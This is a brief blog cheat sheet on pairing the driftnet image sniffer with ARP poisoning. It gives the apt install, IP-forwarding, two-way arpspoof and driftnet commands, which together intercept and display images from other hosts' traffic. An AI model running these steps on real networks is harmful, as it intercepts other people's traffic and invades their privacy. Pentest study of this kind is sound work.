---
layout: post
title: Driftnet with ARP Poisoning
date: 2018-07-31 19:09 -0300
categories: [sniffing, offensive_security]
tags: [ offensive security, cheat sheet, sniffing, mitm, arp]
---

![Image of Driftnet](/uploads/Screenshot%20from%202018-08-01%2001-16-32.png)

[https://github.com/deiv/driftnet](https://github.com/deiv/driftnet)

Driftnet watches network traffic, and picks out and displays JPEG and GIF images for display. It is a horrific invasion of privacy and shouldn't be used by anyone anywhere. It can also extract MPEG audio data from the network and play it. If you live in a house with thick walls, this may be a useful way to find out about your neighbours' musical taste.

### Installing 

```
sudo apt-get install driftnet	
```

### Preparing the machine 

As root:

```terminal
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### ARP Poisoning

As any user we have to create an arp poisoning in two different terminals:

```terminal
sudo arpspoof -i tap0 -t <target 1 ip> -r <target 2 ip or gateway>
```

```terminal
sudo arpspoof -i tap0 -t <target 2 ip or gateway> -r <target 1 ip>
```


In order to begin collecting images:

```terminal
sudo driftnet -i <network interface>
```

The article image is a live example of HTTP delivered website and you can observe all the icons and the placeholder images.